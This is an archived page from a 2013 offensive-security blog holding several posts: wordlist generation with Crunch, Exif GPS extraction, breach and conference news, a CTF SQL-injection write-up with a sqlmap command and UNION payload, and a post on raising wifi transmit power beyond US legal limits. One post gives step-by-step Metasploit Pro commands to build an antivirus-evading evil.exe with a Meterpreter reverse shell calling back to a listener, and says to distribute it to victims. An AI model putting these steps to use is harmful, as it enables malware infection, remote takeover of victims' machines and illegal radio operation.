@@ -1,0 +1,874 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>cubalo</title>
+  <meta name="author" content="Matt">
+
+  
+  <meta name="description" content="Tweet Creating Wordlists With Crunch Crunch is a wordlist generator project which can create long and complex lists to audit the strength of &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://cubalo.github.io/blog/page/2/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="/javascripts/ender.js"></script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <link href="/atom.xml" rel="alternate" title="cubalo" type="application/atom+xml">
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body >
+  <header role="banner" id="sidebar">
+    <!-- Logo -->
+<aside id="logo" class="clearfix">
+  <div class="clearfix">
+    <a href="/">cubalo</a>
+  </div>
+</aside>
+
+<ul id="menu">
+
+  <li class="title">
+    <h1 id="title"><a href="/">cubalo</a></h1>
+  </li>
+
+
+  <li class="subtitle">
+    <h2 id="subtitle">Ramblings of an OFFSEC grunt</h2>
+  </li>
+
+  <li class="link">
+    <a href="/about/">about</a>
+  </li>
+
+  <li class="link">
+    <a href="http://twitter.com/mchandx/">twitter</a>
+  </li>
+
+
+  <li class="link">
+    <a href="http://github.com/mchandx/">github</a>
+  </li>
+
+  <li class="link rss">
+    <a href="/atom.xml">rss feed</a>
+  </li>
+</ul>
+
+
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:cubalo.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+
+
+<!-- Octopress Love -->
+<aside id="octopress_linkback">
+  <a href="http://octopress.org/">
+    <span class="unicode_square">
+      <span class="unicode_circle">
+        &nbsp;
+      </span>
+    </span>
+    <span class="octopress">Powered by Octopress</span>
+  </a>
+</aside>
+
+  </header>
+  <section id="main">
+      
+  
+  
+    <article class="post">
+      <div class="sharing-box">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://cubalo.github.io/blog/page/2/index.html" data-via="mchandx" data-counturl="http://cubalo.github.io/blog/page/2/index.html" data-size="large">Tweet</a>
+  
+  
+  
+</div>
+
+      
+  <header>
+    
+      <h2 class="entry-title">
+        
+        <a href="/blog/2013/09/13/creating-wordlists-with-crunch/">Creating Wordlists With Crunch</a>
+        
+      </h2>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-09-13T00:00:00-04:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+  <p>Crunch is a wordlist generator project which can create long and complex lists to audit the strength of passwords. This tool also affords a great level of control in creating wordlists, allowing users to control the characters used, minimum and maximum lengths, and specify certain patterns. It is designed to be used with Linux, so support for Windows/BSD/OS X is unknown.</p>
+<h2>Installation</h2>
+<p>To install Crunch, first download the latest version (currently 3.4) from Sourceforge.</p>
+<pre>http://sourceforge.net/projects/crunch-wordlist/files/crunch-wordlist/crunch-3.4.tgz/download</pre>
+<p>Then extract the files from the archive.</p>
+<pre>tar -xvf crunch-3.4.tar.gz</pre>
+<p>Finally, change into the new Crunch directory and install the tool.</p>
+<pre>cd crunch-3.4</pre>
+<pre>make &amp;&amp; make install</pre>
+<h2>Usage</h2>
+<p>You can check the user manual by using the man command. Basic usage is as follows</p>
+<pre>./crunch [min length] [max length] [character set] [options]</pre>
+<h3>Examples:</h3>
+<p>Create a list of all lowercase alpha passwords 3 characters in length:</p>
+<pre>./crunch 3 3</pre>
+<p>Create a list of passwords 4 characters in length using only 1, 2, 3, A, B, C, and D:</p>
+<pre>./crunch 4 4 123ABCD</pre>
+<p>Create the same list as above, including the special characters $, %, and &amp;:</p>
+<pre>./crunch 4 4 123ABCD\$\%<pre wp-pre-tag-7></pre>amp;</pre>
+<p>Send the output of the previous command to a file and zip it in the 7zip format:</p>
+<pre>./crunch 4 4 123ABCD\$\%<pre wp-pre-tag-8></pre>amp; -o new_wordlist.txt -z 7z</pre>
+<p>Use the rainbow tables character sets file (charset.txt) to create a list of passwords 4-8 characters in length including upper, lower, numerical and special:</p>
+<pre>./crunch 4 8 -f charset.txt mixalpha-numeric-all</pre>
+<p><em>Note: charset.txt can be found <a href="http://www.rainbowtables.net/misc/charset.txt">here</a></em></p>
+
+  
+  
+
+
+    </article>
+  
+  
+    <article class="post">
+      <div class="sharing-box">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://cubalo.github.io/blog/page/2/index.html" data-via="mchandx" data-counturl="http://cubalo.github.io/blog/page/2/index.html" data-size="large">Tweet</a>
+  
+  
+  
+</div>
+
+      
+  <header>
+    
+      <h2 class="entry-title">
+        
+        <a href="/blog/2013/08/05/gen-alexander-black-hat-2013/">Gen. Alexander Black Hat 2013 Keynote</a>
+        
+      </h2>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-08-05T00:00:00-04:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+  <p>http://www.youtube.com/watch?v=V3_pmuJRs84</p>
+
+  
+  
+
+
+    </article>
+  
+  
+    <article class="post">
+      <div class="sharing-box">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://cubalo.github.io/blog/page/2/index.html" data-via="mchandx" data-counturl="http://cubalo.github.io/blog/page/2/index.html" data-size="large">Tweet</a>
+  
+  
+  
+</div>
+
+      
+  <header>
+    
+      <h2 class="entry-title">
+        
+        <a href="/blog/2013/07/26/extracting-exif-data-with-linux/">Extracting Exif Data With Linux</a>
+        
+      </h2>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-07-26T00:00:00-04:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+  <p>Exchangeable image file format, or Exif, is a standard for storing information in image files. Most digital cameras, including smartphones, use Exif annotations. Some of the information stored includes exposure time, shutter speed, and F number, but more important to us is the date and time the photo was taken as well as GPS information. This information can be used to identify when and where a photo was taken, an obvious security concern.</p>
+<p>Granted, this is relatively old news but still relevant due to the sheer number of iPhones out there and the fact that you have to explicitly decline geotagging on those devices.</p>
+<p>In this post, I&#8217;m going to show how to retrieve this data from a photo and extract the useful information to track down when and where a photo was taken.</p>
+<p>The first thing to do is to install exiftools. Do this with the following command.</p>
+<pre>sudo apt-get install libimage-exiftool-perl</pre>
+<p>Once that is installed, grab the picture you want to analyze. <strong>It must be in either .TIF or .JPG format or you will not be able to pull the data. </strong>Put the picture somewhere easy to remember and run this command:</p>
+<pre>exifdata -a photo.JPG</pre>
+<p>This will display all of the Exif data available. There are a few key fields to look for:</p>
+<ul>
+<li><span style="line-height: 13px;">Make</span></li>
+<li>Camera Model Name</li>
+<li>Create Date</li>
+<li>GPS Latitude</li>
+<li>GPS Longitude</li>
+</ul>
+<p>Instead of parsing through all of that information for every photo, the following command will extract all of that information we care about.</p>
+<pre>exiftool -a -make -model -DateTimeOriginal -gps:all photo.JPG</pre>
+<p>This will present the information like so.</p>
+<pre>Make : Apple
+Camera Model Name : iPhone 5
+Date/Time Original : 2013:06:10 13:55:46
+GPS LatitudRee Ref : North
+GPS Latitude : 25 deg 11' 50.2152"
+GPS Longitude Ref : East
+GPS Longitude : 55 deg 16' 27.2208"
+GPS Altitude Ref : Above Sea Level
+GPS Altitude : 835.8427653 m
+GPS Time Stamp : 09:55:45.73
+GPS Img Direction Ref : True North
+GPS Img Direction : 5.834875116</pre>
+<p>Now this information can be taken to Google Maps/Earth and you can locate where that photo was taken within a few meters. For the sample above, this is what you should see:</p>
+<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/07/google_maps_GPS.jpg"><img class="alignnone size-medium wp-image-162" alt="google_maps_GPS" src="http://www.cubalo.com/blog/wp-content/uploads/2013/07/google_maps_GPS-300x136.jpg" width="300" height="136" /></a></p>
+<h2> Remediation</h2>
+<p>Luckily this is very easy to fix on the iPhone. To avoid this happening to you, go into Settings &gt; Privacy &gt; Location Services  and make sure the slider next to Camera is set to &#8220;OFF.&#8221; Now GPS tags will not be added to your photos. If you alread have a photo you would like to remove the geotags from, issue the following command.</p>
+<pre>exiftool -a -gps:all= /Path/To/Image.JPG</pre>
+
+  
+  
+
+
+    </article>
+  
+  
+    <article class="post">
+      <div class="sharing-box">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://cubalo.github.io/blog/page/2/index.html" data-via="mchandx" data-counturl="http://cubalo.github.io/blog/page/2/index.html" data-size="large">Tweet</a>
+  
+  
+  
+</div>
+
+      
+  <header>
+    
+      <h2 class="entry-title">
+        
+        <a href="/blog/2013/07/21/ubuntu-forums-breached/">Ubuntu Forums Breached</a>
+        
+      </h2>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-07-21T00:00:00-04:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+  <p>At 20:11UTC, a defacement of the Ubuntu Forums was reported to Canonical and at 20:15UTC the site was taken down and replaced with a splash page. According to the official Canonical statement, the attack method used in the breach is still unknown. The statement also states:</p>
+<blockquote>
+<ul>
+<li>We have confirmed the attackers <strong>were able to access all user email addresses and hashed passwords</strong> on the Forums site. While the passwords were not stored in plain text, good practice dictates that users should assume the passwords have been accessed and change them. If users used the same password on other services they should immediately change that password.</li>
+</ul>
+<ul>
+<li>We believe the issue is limited to the Ubuntu Forums and no other Ubuntu or Canonical site or service is affected.</li>
+</ul>
+<ul>
+<li>We have begun the process of notifying by email all users whose details have been compromised.</li>
+</ul>
+</blockquote>
+<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/07/ubuntu_forums_screenshot.png"><img class="size-medium wp-image-171 aligncenter" alt="ubuntu_forums_screenshot" src="http://www.cubalo.com/blog/wp-content/uploads/2013/07/ubuntu_forums_screenshot-300x150.png" width="300" height="150" /></a></p>
+<p>If you are affected by this breach, now would be the time to update your passwords of other services, especially if you duplicate passwords. I will update this post as more information becomes available.</p>
+
+  
+  
+
+
+    </article>
+  
+  
+    <article class="post">
+      <div class="sharing-box">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://cubalo.github.io/blog/page/2/index.html" data-via="mchandx" data-counturl="http://cubalo.github.io/blog/page/2/index.html" data-size="large">Tweet</a>
+  
+  
+  
+</div>
+
+      
+  <header>
+    
+      <h2 class="entry-title">
+        
+        <a href="/blog/2013/07/21/black-hat-usa-2013-briefings-to-attend/">Black Hat USA 2013 - Briefings to Attend</a>
+        
+      </h2>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-07-21T00:00:00-04:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+  <p>I was reading through the talks that were selected for Black Hat USA this year and picked out a few that I found interesting. If you are going, I would recommend seeing these if at all possible and if you cannot, they should be posted online within a few months. I&#8217;ve linked each title to the description on the Black Hat website.</p>
+<ul>
+<li><a href="https://www.blackhat.com/us-13/briefings.html#Reidy" target="_blank">Combating the Insider Threat at the FBI: Real World Lessons Learned</a></li>
+<li><a href="https://www.blackhat.com/us-13/briefings.html#Hofmann2" target="_blank">What Security Researchers Need to Know About Anti-Hacking Law</a></li>
+<li><a href="https://www.blackhat.com/us-13/briefings.html#Esparza" target="_blank">PDF Attack: A Journey From the Exploit Kit to the Shellcode</a></li>
+<li><a href="https://www.blackhat.com/us-13/briefings.html#Niemi" target="_blank">Evading Deep Inspection for Fun and Shell</a></li>
+<li><a href="https://www.blackhat.com/us-13/briefings.html#Cole" target="_blank">OPSEC Failures of Spies</a></li>
+<li><a href="https://www.blackhat.com/us-13/briefings.html#Porter" target="_blank">Let&#8217;s Get Physical: Breaking Home Security Systems and Bypassing Buildings Controls</a></li>
+<li><a href="https://www.blackhat.com/us-13/briefings.html#Lee" target="_blank">Hacking, Surveilling, and Deceiving Victims on Smart TV</a></li>
+<li><a href="https://www.blackhat.com/us-13/briefings.html#Lau" target="_blank">Mactans: Injecting Malware Into iOS Devices Via Malicious Chargers</a></li>
+<li><a href="https://www.blackhat.com/us-13/briefings.html#Duckwall" target="_blank">Pass-the-Hash 2: The Admin&#8217;s Revenge</a></li>
+<li><a href="https://www.blackhat.com/us-13/briefings.html#Yarochkin" target="_blank">Hunting the Shadows: In Depth Analysis of Escalated APT Attacks</a></li>
+<li><a href="https://www.blackhat.com/us-13/briefings.html#Salgado" target="_blank">&#8217;) UNION SELECT `THIS_TALK` AS (&#8216;NEW OPTIMIZATION AND OBFUSCATION TECHNIQUES’)%00</a></li>
+<li><a href="https://www.blackhat.com/us-13/briefings.html#Espinhara" target="_blank">Using Online Activity as Digital Fingerprints to Create a Better Spear Phisher</a></li>
+<li><a href="https://www.blackhat.com/us-13/briefings.html#Crowley" target="_blank">Home Invasion v2.0 - Attacking Network-Controlled Hardware</a></li>
+<li><a href="https://www.blackhat.com/us-13/briefings.html#Heffner" target="_blank">Exploiting Network Surveillance Cameras Like a Hollywood Hacker</a></li>
+<li><a href="https://www.blackhat.com/us-13/briefings.html#Williams" target="_blank">Post Exploitation Operations with Cloud Synchronization Services</a></li>
+</ul>
+
+  
+  
+
+
+    </article>
+  
+  
+    <article class="post">
+      <div class="sharing-box">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://cubalo.github.io/blog/page/2/index.html" data-via="mchandx" data-counturl="http://cubalo.github.io/blog/page/2/index.html" data-size="large">Tweet</a>
+  
+  
+  
+</div>
+
+      
+  <header>
+    
+      <h2 class="entry-title">
+        
+        <a href="/blog/2013/07/20/increasing-the-strength-of-directional-802-11-antennas/">Increasing the Strength of Directional 802.11 Antennas</a>
+        
+      </h2>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-07-20T00:00:00-04:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+  <p><strong>NOTE: The methods described in this tutorial are <span style="text-decoration: underline;">illegal</span> in the United States. I cannot be held responsible for what you choose to do with this information. Please see <a href="http://www.ecfr.gov/cgi-bin/text-idx?c=ecfr&amp;SID=46df928b983f3d87aec0fc5c468ca9a1&amp;rgn=div5&amp;view=text&amp;node=47:1.0.1.1.16&amp;idno=47#47:1.0.1.1.16.3.234.31" target="_blank">FCC Title 47, Section 15.247</a> for more information on RF regulations and limitations within the US.</strong></p>
+<p>I recently learned about a little trick for getting the most out of directional wifi antennas. In the US, the FCC prohibits devices with a maximum Equivalent Isotropically Radiated Power (EIRP) greater than 36dBm (4 Watts). This is calculated by adding the antenna gain and the device&#8217;s output power. The table below shows some examples.</p>
+<table width="93%" border="0">
+<tbody>
+<tr>
+<td align="center" height="34"><b><span style="font-size: small;">Antenna<br />
+Gain (dBi)</span></b></td>
+<td align="center" height="34"><b><span style="font-size: small;">Device Output<br />
+Power Allowed</span></b></td>
+<td align="center" height="34"><b><span style="font-size: small;">EIRP<br />
+(dBm)</span></b></td>
+<td align="center" height="34"><b><span style="font-size: small;">EIRP<br />
+(Watts)</span></b></td>
+</tr>
+<tr>
+<td align="center"><span style="font-family: Arial; font-size: small;">6</span></td>
+<td align="center"><span style="font-family: Arial; font-size: small;">30dBm or 1000mW</span></td>
+<td align="center"><span style="font-family: Arial; font-size: small;">36</span></td>
+<td align="center"><span style="font-family: Arial; font-size: small;">4</span></td>
+</tr>
+<tr>
+<td align="center"><span style="font-family: Arial; font-size: small;">9</span></td>
+<td align="center"><span style="font-family: Arial; font-size: small;">27dBm or 500mW</span></td>
+<td align="center"><span style="font-family: Arial; font-size: small;">36</span></td>
+<td align="center"><span style="font-family: Arial; font-size: small;">4</span></td>
+</tr>
+<tr>
+<td align="center"><span style="font-family: Arial; font-size: small;">12</span></td>
+<td align="center"><span style="font-family: Arial; font-size: small;">24dBm or 250mW</span></td>
+<td align="center"><span style="font-family: Arial; font-size: small;">36</span></td>
+<td align="center"><span style="font-family: Arial; font-size: small;">4</span></td>
+</tr>
+<tr>
+<td align="center"><span style="font-family: Arial; font-size: small;">15</span></td>
+<td align="center"><span style="font-family: Arial; font-size: small;">21dBm or 125mW</span></td>
+<td align="center"><span style="font-family: Arial; font-size: small;">36</span></td>
+<td align="center"><span style="font-family: Arial; font-size: small;">4</span></td>
+</tr>
+</tbody>
+</table>
+<p>So by giving a high-gain device more power, say all the way up to 1W (1000mW), you could go past this EIRP limit and increase the strength of the signal. Mind you, this is not only illegal but can also cause a serious health hazard. So if you plan to try this, please read the <a href="http://transition.fcc.gov/Bureaus/Engineering_Technology/Documents/bulletins/oet65/oet65.pdf" target="_blank">FCC OET 65 guidlines for human safety</a>.</p>
+<p>Implementing this only takes a few commands. Linux&#8217;s iw command allows you to manipulate radios connected to your device very simply. The first thing to do is to connect your radio and find out which interface it comes up as. You can find this information with the iwconfig command. This is what mine looked like:</p>
+<pre>root@cubalo:~# iwconfig 
+lo no wireless extensions.
+
+wlan1 IEEE 802.11abgn ESSID:off/any 
+ Mode:Managed Access Point: Not-Associated Tx-Power=27 dBm 
+ Retry long limit:7 RTS thr:off Fragment thr:off
+ Encryption key:off
+ Power Management:on</pre>
+<p>The important field to watch is &#8220;Tx-Power.&#8221;</p>
+<p>Now that we know the radio came up as wlan1, we can manipulate it by changing the country code and thus removing the FCC restrictions. For example&#8217;s sake, we will change the country code to Bolivia, but in theory you could change it to whatever ISO 3166-alpha2 country code you want.</p>
+<pre>ifconfig wlan1 down
+iw reg set BO</pre>
+<p>Now you are free to up the power and you can also use higher channels than the FCC allows in the States. Make sure to set the tx power to use the maximum output possible. My radio can handle 1000mW (1W), so I will use 30dBm in the command below, but you can change that to suit your needs. To change the tx power and bring the interface back up, use the following command:</p>
+<pre>iwconfig wlan1 txpower 30
+ifconfig wlan1 up</pre>
+<p>Finally, check the interface&#8217;s configuration again and verify that the Tx-Power field has changed.</p>
+<pre>root@cubalo:~# iwconfig wlan1
+wlan1 IEEE 802.11abgn ESSID:off/any 
+ Mode:Managed Frequency:2.472 GHz Access Point: Not-Associated 
+ Tx-Power=30 dBm 
+ Retry long limit:7 RTS thr:off Fragment thr:off
+ Encryption key:off
+ Power Management:on</pre>
+<p>For more information about manipulating the radio, read the <a href="http://wireless.kernel.org/en/users/Documentation/iw" target="_blank">Linux wireless documentation</a>.</p>
+
+  
+  
+
+
+    </article>
+  
+  
+    <article class="post">
+      <div class="sharing-box">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://cubalo.github.io/blog/page/2/index.html" data-via="mchandx" data-counturl="http://cubalo.github.io/blog/page/2/index.html" data-size="large">Tweet</a>
+  
+  
+  
+</div>
+
+      
+  <header>
+    
+      <h2 class="entry-title">
+        
+        <a href="/blog/2013/06/14/2013-owasp-top-10-released/">2013 OWASP Top 10 Released</a>
+        
+      </h2>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-06-14T00:00:00-04:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+  <p>On June 12, the Open Web Application Security Project (OWASP) released an updated list of the top 10 web application vulnerabilities facing developers. This is the first major update to the list since 2010, which was well integrated into many web app testing frameworks and methodologies.</p>
+<p>The OWASP Top 10 - 2013 is as follows:</p>
+<ul>
+<li>A1 - <a href="https://www.owasp.org/index.php/Top_10_2013-A1-Injection" target="_blank">Injection</a></li>
+<li>A2 - <a href="https://www.owasp.org/index.php/Top_10_2013-A2-Broken_Authentication_and_Session_Management" target="_blank">Broken Authentication and Session Management</a> (was formerly 2010-A3)</li>
+<li>A3 - <a href="https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)" target="_blank">Cross-Site Scripting (XSS)</a> (was formerly 2010-A2)</li>
+<li>A4 - <a href="https://www.owasp.org/index.php/Top_10_2013-A4-Insecure_Direct_Object_References" target="_blank">Insecure Direct Object References</a></li>
+<li>A5 - <a href="https://www.owasp.org/index.php/Top_10_2013-A5-Security_Misconfiguration" target="_blank">Security Misconfiguration</a> (was formerly 2010-A6)</li>
+<li>A6 - <a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure" target="_blank">Sensitive Data Exposure</a> (2010-A7 Insecure Cryptographic Storage and 2010-A9 Insufficient Transport Layer Protection were merged to form 2013-A6)</li>
+<li>A7 - <a href="https://www.owasp.org/index.php/Top_10_2013-A7-Missing_Function_Level_Access_Control" target="_blank">Missing Function Level Access Control</a> (renamed/broadened from 2010-A8 Failure to Restrict URL Access)</li>
+<li>A8 - <a href="https://www.owasp.org/index.php/Top_10_2013-A8-Cross-Site_Request_Forgery_(CSRF)" target="_blank">Cross-Site Request Forgery (CSRF) </a>(was formerly 2010-A5)</li>
+<li>A9 - <a href="https://www.owasp.org/index.php/Top_10_2013-A9-Using_Components_with_Known_Vulnerabilities" target="_blank">Using Known Vulnerable Components</a> (new but was part of 2010-A6 – Security Misconfiguration)</li>
+<li>A10 - <a href="https://www.owasp.org/index.php/Top_10_2013-A10-Unvalidated_Redirects_and_Forwards" target="_blank">Unvalidated Redirects and Forwards</a></li>
+</ul>
+<p>For more information, head over to the <a href="https://www.owasp.org/index.php/Top10" target="_blank">OWASP Top 10 project page.</a></p>
+
+  
+  
+
+
+    </article>
+  
+  
+    <article class="post">
+      <div class="sharing-box">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://cubalo.github.io/blog/page/2/index.html" data-via="mchandx" data-counturl="http://cubalo.github.io/blog/page/2/index.html" data-size="large">Tweet</a>
+  
+  
+  
+</div>
+
+      
+  <header>
+    
+      <h2 class="entry-title">
+        
+        <a href="/blog/2013/05/08/update-av-evasion-with-metasploit-pros-dynamic-executable-option/">[UPDATE] AV Evasion With Metasploit Pro&#8217;s Dynamic Executable Option</a>
+        
+      </h2>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-05-08T00:00:00-04:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+  <p>A while back, I posted a tutorial about basic antivirus evasion with Metasploit but the methods I described had a very high rate of detection. I figured it was since Metasploit&#8217;s payloads are so well know that AV vendors have been able to get signatures for a large majority of the payloads that have been encoded, packed, etc, rendering them virtually unusable.</p>
+<p>Now, if your work buys you toys like mine does it is possible that you have access to Metasploit Pro (the paid version of Metasploit). It comes with a few cool gadgets like a web interface that allows you to manage &#8220;campaigns&#8221; as well as a few added exploits and payloads. However, we are specifically interested in one option: exploit/pro/windows/dynamic_exe</p>
+<p>Start by firing up the MSP console</p>
+<pre>msfpro</pre>
+<p>Then use the exploit/pro/windows/dynamic_exe option</p>
+<pre>use exploit/pro/windows/dynamic_exe</pre>
+<p>Then set the payload you want to use. I&#8217;ll use a Meterpreter reverse TCP for simplicity sake.</p>
+<pre>set PAYLOAD windows/meterpreter/reverse_tcp</pre>
+<p>Then set the options for the dynamic executable template</p>
+<pre><span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">set FILENAME evil.exe</span>
+<span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">set SERVICE false</span></pre>
+<p>These options set the file name to evil.exe and makes sure that the new executable is not a service EXE (haven&#8217;t had much luck with that.)</p>
+<p>Finally, set your standard Meterpreter options</p>
+<pre><span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">set LHOST 174.143.236.106</span>
+<span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">set LPORT 4443</span>
+<span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">set ExitOnSession false</span>
+<span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">exploit</span></pre>
+<p>Once you tell it to exploit, MSP will drop the executable under your home directory (/root/.msf4/local/evil.exe on a default Kali install)</p>
+<p>Now that you have a file to distribute to your victims, set up a simple MSP/F listener with the same details you set when building the exe.</p>
+<pre><span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">use exploit/multi/handler</span>
+<span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">set PAYLOAD windows/meterpreter/reverse_tcp</span>
+<span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">set LHOST 174.143.236.106</span>
+<span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">set LPORT 4443</span>
+<span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">set ExitOnSession false</span>
+<span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">exploit -j (I suggest running this as a job as there may be slow turnaround)</span></pre>
+<p>All that is left to do is to distribute that evil.exe file to your victims and wait for someone to click it. Once it is opened, you will see a standard Meterpreter session opened on your listening box.</p>
+<p>A quick note, <strong><span style="text-decoration: underline;">PLEASE</span> DO NOT SUBMIT WHATEVER PAYLOAD, EXECUTABLE, ETC YOU CREATE TO VIRUSTOTAL!</strong></p>
+
+  
+  
+
+
+    </article>
+  
+  
+    <article class="post">
+      <div class="sharing-box">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://cubalo.github.io/blog/page/2/index.html" data-via="mchandx" data-counturl="http://cubalo.github.io/blog/page/2/index.html" data-size="large">Tweet</a>
+  
+  
+  
+</div>
+
+      
+  <header>
+    
+      <h2 class="entry-title">
+        
+        <a href="/blog/2013/04/21/plaidctf-2013-writeup/">PlaidCTF 2013 Writeup</a>
+        
+      </h2>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-04-21T00:00:00-04:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+  <p>PlaidCTF 2013 was a capture the flag tournament put on by the <a href="http://ppp.cylab.cmu.edu/wordpress/">Plaid Parliament of Pwning</a> and sponsored by <a href="http://www.endgame.com/#home">ENDGAME</a>. Unfortunately, I was unable to commit 100% to the CTF due to being under the weather and having family in town, but I figured I&#8217;d share what I solved. Most of the challenges were reverse engineering and forensics (not my strongest points), but it was fun nonetheless.</p>
+<h1>charsheet (Web - 150)</h1>
+<p><strong>Problem: My friend is in my D&amp;D campaign - could you get me his character name? He administrates <a href="http://54.234.77.50/" target="_blank">this site</a>. Or <a href="http://54.235.50.140/">here (faster)</a>.</strong></p>
+<p>On the site, there is a RPG Web Profiler app that catalouges RPG characters and their campaigns. The goal is the find the user who admins the site.</p>
+<p>That meant that I needed to find a listing of all users in the game. The problem is that users can choose whether or not to make their profile public (only about 45 at the time of completion did) so I had to find a way to either make users change their profile to public, of get a full listing of active users from the backend database.</p>
+<p>At first, I signed into my profile and found a section where you could set your profile image from a file out on the web, so I figured why not try some CSRF? I inserted a URL that would set a user&#8217;s profile to &#8220;Public&#8221; and saved. As users would hit my profile, it would make their profile Public and anyone could access it.</p>
+<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/04/profile_pic_uploader.png"><img class="alignnone size-medium wp-image-114" alt="profile_pic_uploader" src="http://www.cubalo.com/blog/wp-content/uploads/2013/04/profile_pic_uploader-300x158.png" width="300" height="158" /></a></p>
+<p>The problem with this though was that I had to hope the admin user was live and would hit my profile. To make the likelihood of getting that admin user to give up their privacy, I changed my CSRF link to a URL that would transfer ownership of the account to me. Once I had compromised an account, I would change their profile picture to the CSRF that would make a user switch to &#8220;Public.&#8221;</p>
+<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/04/captured_profiles.png"><img class="alignnone size-medium wp-image-111" alt="captured_profiles" src="http://www.cubalo.com/blog/wp-content/uploads/2013/04/captured_profiles-300x96.png" width="300" height="96" /></a></p>
+<p>I quickly found that although effective, it would take a long time to complete so I started to explore other options.</p>
+<p>I found a search field and tried a basic &#8221; &#8217; Or 1=1-&#8221; on it and it threw an error! Woohoo!</p>
+<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/04/sql_error.png"><img class="alignnone size-medium wp-image-116" alt="sql_error" src="http://www.cubalo.com/blog/wp-content/uploads/2013/04/sql_error-300x40.png" width="300" height="40" /></a></p>
+<p>So now I knew that there was a vulnerable MySQL server running in the background. I tried my luck with a raw connection to the database, but no dice so I fired up sqlmap and got to work.</p>
+<p>I pointed it at the site with the following string:</p>
+<pre>./sqlmap.py -u "http://54.234.77.50/search.php?type=contains&amp;cname=1"</pre>
+<p>and compromised the database with the string:</p>
+<pre>type=contains&amp;cname=1') UNION ALL SELECT NULL, NULL, NULL, CONCAT(CHAR(58,105,116,113,58),CHAR(79,71,65,69,80,88,106,99,66,67),CHAR(58,102,118,121,58)), NULL, NULL# AND ('kCbZ'='kCbZ
+---</pre>
